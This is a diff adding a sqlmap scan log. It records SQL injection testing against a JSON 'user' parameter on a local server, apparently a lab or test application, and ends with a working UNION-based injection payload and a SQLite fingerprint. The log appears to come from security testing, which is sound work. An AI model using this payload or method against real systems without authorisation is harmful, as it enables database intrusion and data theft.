@@ -1,0 +1,73 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.11#pip}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:40:37 /2026-11-05/
+
+[19:40:37] [WARNING] using '/private/var/folders/8c/txc1vlvx763gszf8dpnn3kvc0000gn/T/tmppz4ada40' as the output directory
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[19:40:37] [INFO] testing connection to the target URL
+[19:40:37] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.14.7')
+[19:40:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:40:37] [INFO] testing if the target URL content is stable
+[19:40:38] [INFO] target URL content is stable
+[19:40:38] [INFO] testing if (custom) POST parameter 'JSON user' is dynamic
+[19:40:38] [WARNING] (custom) POST parameter 'JSON user' does not appear to be dynamic
+[19:40:38] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON user' might be SQL injectable
+[19:40:38] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user'
+[19:40:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:40:38] [WARNING] reflective value(s) found and filtering out
+[19:40:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:40:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[19:40:38] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:40:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[19:40:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[19:40:38] [INFO] testing 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)'
+[19:40:38] [INFO] testing 'Generic inline queries'
+[19:40:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:40:38] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[19:40:38] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[19:40:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[19:40:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:40:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[19:40:38] [INFO] testing 'Oracle AND time-based blind'
+[19:40:38] [INFO] testing 'CUBRID AND time-based blind (SLEEP)'
+[19:40:38] [INFO] testing 'CUBRID OR time-based blind (SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[19:40:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[19:40:38] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[19:40:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[19:40:38] [INFO] target URL appears to have 2 columns in query
+[19:40:38] [WARNING] applying generic concatenation (CONCAT)
+[19:40:38] [INFO] (custom) POST parameter 'JSON user' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
+[19:40:38] [INFO] checking if the injection point on (custom) POST parameter 'JSON user' is a false positive
+(custom) POST parameter 'JSON user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 102 HTTP(s) requests:
+---
+Parameter: JSON user ((custom) POST)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: {"user":"alice' UNION ALL SELECT NULL,CONCAT(CONCAT('qjkzq','nAimcCdrtGLPEEIjRqQaIzXGQuouOUEAnTHwkwBU'),'qbbzq')-- GPdJ","pw":"x"}
+---
+[19:40:38] [INFO] testing MySQL
+[19:40:38] [WARNING] the back-end DBMS is not MySQL
+[19:40:38] [INFO] testing Oracle
+[19:40:38] [WARNING] the back-end DBMS is not Oracle
+[19:40:38] [INFO] testing PostgreSQL
+[19:40:38] [WARNING] the back-end DBMS is not PostgreSQL
+[19:40:38] [INFO] testing Microsoft SQL Server
+[19:40:38] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[19:40:38] [INFO] testing SQLite
+[19:40:38] [INFO] confirming SQLite
+[19:40:38] [INFO] actively fingerprinting SQLite
+[19:40:38] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[19:40:38] [INFO] fetched data logged to text files under '/private/var/folders/8c/txc1vlvx763gszf8dpnn3kvc0000gn/T/tmppz4ada40/127.0.0.1'
+
+[*] ending @ 19:40:38 /2026-11-05/
+
